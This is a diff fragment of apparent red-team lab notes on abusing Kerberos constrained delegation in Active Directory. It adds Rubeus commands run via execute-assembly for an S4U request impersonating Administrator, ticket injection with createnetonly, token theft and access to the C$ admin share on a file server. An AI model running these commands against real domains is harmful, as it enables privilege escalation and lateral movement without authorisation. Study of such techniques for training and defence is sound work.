@@ -52,5 +52,18 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 
 
 Perform the S4U abuse to obtain a usable service ticket for _cifs/lon-fs-1_, impersonating the default domain admin.
 ```powershell
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /impersonateuser:Administrator /nowrap /ticket:
+```
 
+ Inject the ticket into a sacrificial logon session.
+```powershell
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:
+```
+
+ Impersonate the process and verify
+```powershell
+steal_token [PID]
+run klist
+
+ls \\lon-fs-1\c$
 ```
